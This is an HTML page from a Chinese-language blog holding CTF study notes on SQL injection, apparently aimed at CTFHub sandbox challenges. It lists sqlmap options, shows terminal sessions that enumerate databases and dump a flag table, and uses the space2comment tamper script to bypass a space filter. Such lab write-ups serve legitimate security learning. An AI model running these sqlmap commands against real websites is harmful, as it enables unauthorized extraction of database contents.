@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.1.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.jpg">
+  <link rel="mask-icon" href="/images/favicon.ong" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"xenonwzh.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.11.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="某些网站上存在 SQL 的漏洞，我们可以利用漏洞进行 SQL 注入获取数据库的信息。 一般来说网址或请求的末尾带有 ?id&#x3D;1 的字样我们就可以考虑 SQL 注入。 然而我完全不会 SQL，于是 sqlmap 大法好 QWQ 本文一切例题均可在 CTFHub 找到。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OIer 的 CTF SQL 注入学习笔记">
+<meta property="og:url" content="https://xenonwzh.github.io/ctf-sql-notes/index.html">
+<meta property="og:site_name" content="XenonWZH&#39;s Blog">
+<meta property="og:description" content="某些网站上存在 SQL 的漏洞，我们可以利用漏洞进行 SQL 注入获取数据库的信息。 一般来说网址或请求的末尾带有 ?id&#x3D;1 的字样我们就可以考虑 SQL 注入。 然而我完全不会 SQL，于是 sqlmap 大法好 QWQ 本文一切例题均可在 CTFHub 找到。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-02-10T00:18:52.000Z">
+<meta property="article:modified_time" content="2023-02-10T01:36:46.370Z">
+<meta property="article:author" content="XenonWZH">
+<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="SQL 注入">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://xenonwzh.github.io/ctf-sql-notes/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://xenonwzh.github.io/ctf-sql-notes/","path":"ctf-sql-notes/","title":"OIer 的 CTF SQL 注入学习笔记"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>OIer 的 CTF SQL 注入学习笔记 | XenonWZH's Blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">XenonWZH's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">玻璃晴朗，橘子辉煌 | AFO</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap-%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">sqlmap 介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-sqlmap-%E8%BF%9B%E8%A1%8C-sql-%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">使用 sqlmap 进行 SQL 注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="nav-number">3.</span> <span class="nav-text">过滤空格</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="XenonWZH"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">XenonWZH</p>
+  <div class="site-description" itemprop="description">XenonWZH's Blog</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">104</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">121</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/XenonWZH" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;XenonWZH" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:xenonwzh@gmail.com" title="E-Mail → mailto:xenonwzh@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://wpa.qq.com/msgrd?V=3&Uin=2856709174" title="QQ → https:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?V&#x3D;3&amp;Uin&#x3D;2856709174" rel="noopener" target="_blank"><i class="fa-brands fa-qq fa-fw"></i>QQ</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/XenonWZH" title="Telegram → https:&#x2F;&#x2F;t.me&#x2F;XenonWZH" rel="noopener" target="_blank"><i class="fa-brands fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/huaruoji/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;huaruoji&#x2F;" rel="noopener" target="_blank">滑蒻稽</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://gmxh.github.io/" title="https:&#x2F;&#x2F;gmxh.github.io" rel="noopener" target="_blank">孤芒星河</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.luogu.com.cn/blog/zxt881/" title="https:&#x2F;&#x2F;www.luogu.com.cn&#x2F;blog&#x2F;zxt881&#x2F;" rel="noopener" target="_blank">zxtikes</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.cascade.moe/" title="https:&#x2F;&#x2F;blog.cascade.moe&#x2F;" rel="noopener" target="_blank">Isoheptane</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://xenonwzh.github.io/ctf-sql-notes/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="XenonWZH">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="XenonWZH's Blog">
+      <meta itemprop="description" content="XenonWZH's Blog">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="OIer 的 CTF SQL 注入学习笔记 | XenonWZH's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          OIer 的 CTF SQL 注入学习笔记
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-02-10 08:18:52 / 修改时间：09:36:46" itemprop="dateCreated datePublished" datetime="2023-02-10T08:18:52+08:00">2023-02-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus：</span>
+    
+    <a title="disqus" href="/ctf-sql-notes/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="ctf-sql-notes/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>某些网站上存在 SQL 的漏洞，我们可以利用漏洞进行 SQL
+注入获取数据库的信息。</p>
+<p>一般来说网址或请求的末尾带有 <code>?id=1</code> 的字样我们就可以考虑
+SQL 注入。</p>
+<p><del>然而我完全不会 SQL，于是 sqlmap 大法好 QWQ</del></p>
+<p>本文一切例题均可在 <a target="_blank" rel="noopener" href="https://www.ctfhub.com/">CTFHub</a>
+找到。</p>
+<span id="more"></span>
+<h1 id="sqlmap-介绍"><code>sqlmap</code> 介绍</h1>
+<p>sqlmap 是一个协助 SQL 注入的工具，且 Kali Linux
+自带。我们可以很方便地获取数据库的信息。</p>
+<p>常用方法如下表：</p>
+<table>
+<colgroup>
+<col style="width: 50%" />
+<col style="width: 50%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>-u &lt;URL&gt;</code></td>
+<td>指定注入链接为 <code>&lt;URL&gt;</code></td>
+</tr>
+<tr class="even">
+<td><code>-r &lt;filename&gt;</code></td>
+<td>指定注入网站的 HTTP 请求为 <code>&lt;filename&gt;</code>
+文本文件中的内容</td>
+</tr>
+<tr class="odd">
+<td><code>--dbs</code></td>
+<td>获取数据库数据</td>
+</tr>
+<tr class="even">
+<td><code>--tables</code></td>
+<td>获取表信息</td>
+</tr>
+<tr class="odd">
+<td><code>--columns</code></td>
+<td>获取列信息</td>
+</tr>
+<tr class="even">
+<td><code>--dump</code></td>
+<td>获取字段内容</td>
+</tr>
+<tr class="odd">
+<td><code>-D &lt;name&gt;</code></td>
+<td>指定搜索的数据库为 <code>&lt;name&gt;</code></td>
+</tr>
+<tr class="even">
+<td><code>-T &lt;name&gt;</code></td>
+<td>指定搜索的表为 <code>&lt;name&gt;</code></td>
+</tr>
+<tr class="odd">
+<td><code>-C &lt;name&gt;</code></td>
+<td>指定搜索的列为 <code>&lt;name&gt;</code></td>
+</tr>
+<tr class="even">
+<td><code>--level &lt;num&gt;</code></td>
+<td>指定搜索等级为 <code>&lt;num&gt;</code></td>
+</tr>
+<tr class="odd">
+<td><code>--cookie "&lt;string&gt;"</code></td>
+<td>指定访问网页时的 Cookie 为 <code>&lt;string&gt;</code></td>
+</tr>
+<tr class="even">
+<td><code>-p "&lt;string&gt;"</code></td>
+<td>指定测试的类型为 <code>&lt;string&gt;</code></td>
+</tr>
+<tr class="odd">
+<td><code>--tamper "&lt;filename&gt;"</code></td>
+<td>附加名为 <code>&lt;filename&gt;</code> 的脚本</td>
+</tr>
+</tbody>
+</table>
+<h1 id="使用-sqlmap-进行-sql-注入">使用 sqlmap 进行 SQL 注入</h1>
+<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; SQL 注入 -&gt;
+整数型注入 / 字符型注入 / 报错注入 / 布尔盲注 / 时间盲注 / MySQL
+结构</p>
+<p>这些题都可用以下套路解决：</p>
+<p>输入 1，我们可以在网址上看到 <code>?id=1</code>
+的字样，于是我们可以使用 sqlmap 进行 SQL 注入。</p>
+<p>在终端中输入以下指令，可获得数据库的信息（部分信息已用省略号代替）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~]</span><br><span class="line">└─$ sqlmap -u http://challenge-XXX.sandbox.ctfhub.com:XXXXX/?id=1 --dbs</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.7#stable&#125;</span><br><span class="line">|_ -| . [(]     | .&#x27;| . |</span><br><span class="line">|___|_  [,]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 08:54:00 /2023-02-10/</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">it looks like the back-end DBMS is &#x27;MySQL&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] y</span><br><span class="line">for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? [Y/n] y</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">GET parameter &#x27;id&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 80 HTTP(s) requests:</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">available databases [4]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sqli</span><br><span class="line"></span><br><span class="line">[08:54:35] [INFO] fetched data logged to text files under &#x27;/home/xenonwzh/.local/share/sqlmap/output/challenge-XXX.sandbox.ctfhub.com&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 08:54:35 /2023-02-10/</span><br></pre></td></tr></table></figure>
+<p>于是我们可知有
+<code>information_schema</code>、<code>mysql</code>、<code>performance_schema</code>
+和 <code>sqli</code> 四个数据库。我们选择 <code>sqli</code>
+数据库进行注入（部分信息已用省略号代替）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~]</span><br><span class="line">└─$ sqlmap -u http://challenge-XXX.sandbox.ctfhub.com:XXXXX/?id=1 -D sqli --tables</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">Database: sqli</span><br><span class="line">[2 tables]</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">| news |</span><br><span class="line">+------+</span><br><span class="line"></span><br><span class="line">[08:59:23] [INFO] fetched data logged to text files under &#x27;/home/xenonwzh/.local/share/sqlmap/output/challenge-XXX.sandbox.ctfhub.com&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 08:59:23 /2023-02-10/</span><br></pre></td></tr></table></figure>
+<p>于是我们可得到 <code>flag</code> 和 <code>news</code>
+两个表，我们选择注入 <code>flag</code>
+表（部分信息已用省略号代替）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~]</span><br><span class="line">└─$ sqlmap -u http://challenge-XXX.sandbox.ctfhub.com:XXXXX/?id=1 -D sqli -T flag --columns --dump</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">Database: sqli</span><br><span class="line">Table: flag</span><br><span class="line">[1 column]</span><br><span class="line">+--------+--------------+</span><br><span class="line">| Column | Type         |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| flag   | varchar(100) |</span><br><span class="line">+--------+--------------+</span><br><span class="line"></span><br><span class="line">[08:59:35] [INFO] fetching columns for table &#x27;flag&#x27; in database &#x27;sqli&#x27;</span><br><span class="line">[08:59:35] [INFO] fetching entries for table &#x27;flag&#x27; in database &#x27;sqli&#x27;</span><br><span class="line">Database: sqli</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+----------------------------------+</span><br><span class="line">| flag                             |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| ctfhub&#123;XXXXXX&#125;                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line"></span><br><span class="line">[08:59:35] [INFO] table &#x27;sqli.flag&#x27; dumped to CSV file &#x27;/home/xenonwzh/.local/share/sqlmap/output/challenge-c35f0537e0f328ea.sandbox.ctfhub.com/dump/sqli/flag.csv&#x27;</span><br><span class="line">[08:59:35] [INFO] fetched data logged to text files under &#x27;/home/xenonwzh/.local/share/sqlmap/output/challenge-c35f0537e0f328ea.sandbox.ctfhub.com&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 08:59:35 /2023-02-10/</span><br></pre></td></tr></table></figure>
+<p>于是我们就获得了 flag。</p>
+<h1 id="过滤空格">过滤空格</h1>
+<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; SQL 注入 -&gt;
+过滤空格</p>
+<p>在注入时候空格被过滤掉了，这时我们可以使用 <code>/**/</code>
+来代替空格。</p>
+<p>sqlmap 有一个附加脚本 <code>space2comment.py</code> 可将空格替换成
+<code>/**/</code>，正好可解决这个问题。</p>
+<p>于是我们执行以下指令即可：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://challenge-XXX.sandbox.ctfhub.com:XXXXX/?id=1&quot;</span> --tamper <span class="string">&quot;space2comment.py&quot;</span> --dbs</span><br><span class="line">sqlmap -u <span class="string">&quot;http://challenge-XXX.sandbox.ctfhub.com:XXXXX/?id=1&quot;</span> --tamper <span class="string">&quot;space2comment.py&quot;</span> -D sqli --tables</span><br><span class="line">sqlmap -u <span class="string">&quot;http://challenge-XXX.sandbox.ctfhub.com:XXXXX/?id=1&quot;</span> --tamper <span class="string">&quot;space2comment.py&quot;</span> -D sqli -T kttcekvceq --columns --dump</span><br></pre></td></tr></table></figure>
+<p>于是可获得 flag。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/SQL-%E6%B3%A8%E5%85%A5/" rel="tag"># SQL 注入</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/ctf-password-notes/" rel="prev" title="OIer 的 CTF 密码口令学习笔记">
+                  <i class="fa fa-chevron-left"></i> OIer 的 CTF 密码口令学习笔记
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments" id="disqus_thread">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">XenonWZH</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js","integrity":"sha256-7wT34TI0pEBeEFoi4z+vhuSddGh6vUTMWdqJ2SDe2jg="}}</script>
+  <script src="/js/third-party/tags/mermaid.js"></script>
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"xenonwzhs-blog","count":true,"i18n":{"disqus":"disqus"}}</script>
+<script src="/js/third-party/comments/disqus.js"></script>
+
+</body>
+</html>
